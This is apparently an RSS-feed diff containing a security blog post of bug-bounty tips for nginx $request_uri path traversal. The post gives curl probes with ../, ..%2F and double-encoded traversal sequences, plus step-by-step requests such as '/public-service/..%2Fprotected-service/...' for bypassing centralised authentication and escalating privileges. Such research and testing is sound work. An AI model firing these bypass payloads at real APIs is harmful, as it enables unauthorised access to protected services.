+&lt;h3 id="other-articles-from-this-series">Other articles from this series&lt;/h3>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://xvnpw.github.io/posts/cve_2021_43557_apache_apisix_path_traversal_in_request_uri_variable/" >CVE-2021-43557: Apache APISIX: Path traversal in request_uri variable&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://xvnpw.github.io/posts/path_traversal_in_authorization_context_in_traefik_and_haproxy/" >Path traversal in authorization context in Traefik and HAProxy&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://xvnpw.github.io/posts/path_traversal_in_authorization_context_in_emissary/" >Path traversal in authorization context in Emissary&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://xvnpw.github.io/posts/path_traversal_in_authorization_context_in_kong_and_f5_nginx/" >Path traversal in authorization context in Kong and F5 NGINX&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://xvnpw.github.io/posts/bug_bounty_tips_for_nginx_request_uri_path_traversal_bypass/" >Bug bounty tips for nginx $request_uri path traversal bypass&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;p>Thanks for reading! You can follow me on &lt;a class="link" href="https://twitter.com/xvnpw" target="_blank" rel="noopener"
+>Twitter&lt;/a>.&lt;/p></description></item><item><title>Bug bounty tips for nginx $request_uri path traversal bypass</title><link>https://xvnpw.github.io/posts/bug_bounty_tips_for_nginx_request_uri_path_traversal_bypass/</link><pubDate>Sat, 27 Nov 2021 22:59:05 +0100</pubDate><guid>https://xvnpw.github.io/posts/bug_bounty_tips_for_nginx_request_uri_path_traversal_bypass/</guid><description>&lt;figure class="image-center">&lt;img src="https://user-images.githubusercontent.com/17719543/139592951-0fafc921-437e-4bb7-b0ee-199dd72b36c3.png"/>
+&lt;/figure>
+&lt;p>In this article, I will extend topic by bug bounty tips for weaknesses in authentication/authorization implementation in relation to nginx&amp;rsquo;s &lt;code>$request_uri&lt;/code> variable.&lt;/p>
+&lt;h2 id="apis">APIs&lt;/h2>
+&lt;p>This vulnerability is for APIs. Best scenario are &lt;strong>microservice&lt;/strong> deployed to Kubernetes and exposed by ingress controller.&lt;/p>
+&lt;h2 id="using-paths">Using paths&lt;/h2>
+&lt;p>API that you are playing with, need to use paths to address services, e.g.:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">OK!
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">https://api.example.com/user-service
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">https://api.example.com/customer-service
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">...
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NOT OK!
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">https://user.example.com/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">https://customer.example.com/
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>First set of URLs is good for exploitation, as you can try sending request with &lt;code>https://api.example.com/user-service/..%2F/customer-service/endpoint1&lt;/code>&lt;/p>
+&lt;h2 id="using-nginx-based-ingress-controller">Using nginx based ingress controller&lt;/h2>
+&lt;p>In this point we have having two condition, using Kubernetes and using nginx based ingress controller, e.g.: kong, Apache APISIX, F5 NGINX. &lt;/p>
+&lt;p>Kubernetes is used in many organizations right now. If you see that API consists of multiply services, you can safely bet on Kubernetes as orchestration. &lt;/p>
+&lt;p>To verify if specific ingress is in place you can try to get error message, e.g.: &lt;code>curl --path-as-is https://api.example.com/sdalksjdeiu23432/cutomer-serivice/endpoint1&lt;/code>&lt;/p>
+&lt;figure>&lt;img src="https://user-images.githubusercontent.com/17719543/139599207-a1c661f7-ac5f-421b-a48f-eabc8c2cea81.png"/>
+&lt;/figure>
+&lt;p>This &lt;code>sdalksjdeiu23432&lt;/code> is just not existing service. You can see that there is nginx in response.&lt;/p>
+&lt;h2 id="normalization-of-and2f">Normalization of ../ and ..%2F&lt;/h2>
+&lt;p>It&amp;rsquo;s good to check what is happening for normalization of paths. Between your machine and ingress could be other servers, e.g: additional proxies or WAF (Web Application Firewall).&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">curl --path-as-is https://api.example.com/sdalksjdeiu23432/../cutomer-serivice/endpoint1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">curl --path-as-is https://api.example.com/sdalksjdeiu23432/..%2F/cutomer-serivice/endpoint1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">curl --path-as-is https://api.example.com/sdalksjdeiu23432/..%252Fcutomer-serivice/endpoint1 &lt;span class="c1"># double encoding&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Comparing results could give you idea about path normalization.&lt;/p>
+&lt;h2 id="external-authentication-service">External authentication service&lt;/h2>
+&lt;p>This is quite hard to investigate. Idea behind external authentication service is about having it centralized. Having broken authentication proof (e.g. JWT) would issue 401/403 on ingress rather than on upstream.&lt;/p>
+&lt;p>I would follow those steps:&lt;/p>
+&lt;ol>
+&lt;li>Login into application&lt;/li>
+&lt;li>Get some request to backend service&lt;/li>
+&lt;li>Change it in a way that authentication proof is broken. For JWT it would be just to place any character into it.&lt;/li>
+&lt;li>Send changed request and see results&lt;/li>
+&lt;/ol>
+&lt;p>Something that you would like to see is:&lt;/p>
+&lt;figure>&lt;img src="https://user-images.githubusercontent.com/17719543/139599242-26908b17-554a-4737-af2c-6f163bb0560e.png"/>
+&lt;/figure>
+&lt;p>If you cannot get any indication whether centralized authentication is in place, you can also assume so and try to exploit.&lt;/p>
+&lt;h2 id="centralized-authorization">Centralized authorization&lt;/h2>
+&lt;p>Authentication service is checking if you are who you are talking to be. But authorization is making decisions about letting you do some action. Having it centralized in some way is necessary for exploitation. If backend services are doing access control on they own, there is &lt;strong>no way&lt;/strong> to exploit it with presented bypass.&lt;/p>
+&lt;p>You can do assumption here, that there is centralized authorization and move on.&lt;/p>
+&lt;h2 id="exploitation">Exploitation&lt;/h2>
+&lt;h3 id="public-service">Public service&lt;/h3>
+&lt;p>Try to find service that is handling requests for anyone. Without any authentication proof. Some kind of public service. If you have one, that&amp;rsquo;s good, if you don&amp;rsquo;t have there is still one thing you can do (described in next paragraph).&lt;/p>
+&lt;p>OK. We have some &lt;code>public-service&lt;/code> and also &lt;code>protected-service&lt;/code> that is only for logged in users (e.g. with valid JWT token). &lt;/p>
+&lt;p>Do some tests:&lt;/p>
+&lt;ol>
+&lt;li>Take a valid request to protected service, e.g. &lt;code>/protected-service/protected?a=1&lt;/code> and change it to &lt;code>/public-service/..%2Fprotected-service/protected?a=1&lt;/code> but send it &lt;strong>without any token&lt;/strong>. &lt;/li>
+&lt;li>Make token invalid and send request from point 1.&lt;/li>
+&lt;li>Wait and make token expired and send request from point 1.&lt;/li>
+&lt;/ol>
+&lt;p>What responses did you get? In case of luck you are already getting valid response for point 1. If not maybe point 2 or 3 was successful for you. If not try with different public and protected services. If you still get no valid response it means that there is no vulnerability here.&lt;/p>
+&lt;h3 id="privilege-escalation">Privilege escalation&lt;/h3>
+&lt;p>There could be implementation of centralized access control that is checking to which group/role user belong.&lt;/p>
+&lt;p>In this situation try following steps:&lt;/p>
+&lt;ol>
+&lt;li>Find endpoint that you cannot access. &lt;/li>
+&lt;li>Take a valid request with authentication proof (e.g. JWT).&lt;/li>
+&lt;li>Send request to endpoint from point 1, but using path traversal described in previous paragraph.&lt;/li>
+&lt;/ol>
+&lt;p>If you didn&amp;rsquo;t success it means that there is no vulnerability here. Sadly… ☹️&lt;/p>
+&lt;h2 id="summary">Summary&lt;/h2>
+&lt;p>I have presented steps that can be inspiration for you. Do not limit yourself and be creative. Happy hunting!&lt;/p>
+&lt;h3 id="other-articles-from-this-series">Other articles from this series&lt;/h3>
+&lt;ul>
+&lt;li>&lt;a class="link" href="https://xvnpw.github.io/posts/cve_2021_43557_apache_apisix_path_traversal_in_request_uri_variable/" >CVE-2021-43557: Apache APISIX: Path traversal in request_uri variable&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://xvnpw.github.io/posts/path_traversal_in_authorization_context_in_traefik_and_haproxy/" >Path traversal in authorization context in Traefik and HAProxy&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://xvnpw.github.io/posts/path_traversal_in_authorization_context_in_emissary/" >Path traversal in authorization context in Emissary&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://xvnpw.github.io/posts/path_traversal_in_authorization_context_in_kong_and_f5_nginx/" >Path traversal in authorization context in Kong and F5 NGINX&lt;/a>&lt;/li>
+&lt;li>&lt;a class="link" href="https://xvnpw.github.io/posts/hunting_for_buggy_authentication_authorization_services_on_github/" >Hunting for buggy authentication/authorization services on github&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;hr>
+&lt;p>Thanks for reading! You can follow me on &lt;a class="link" href="https://twitter.com/xvnpw" target="_blank" rel="noopener"
+>Twitter&lt;/a>.&lt;/p></description></item></channel></rss>
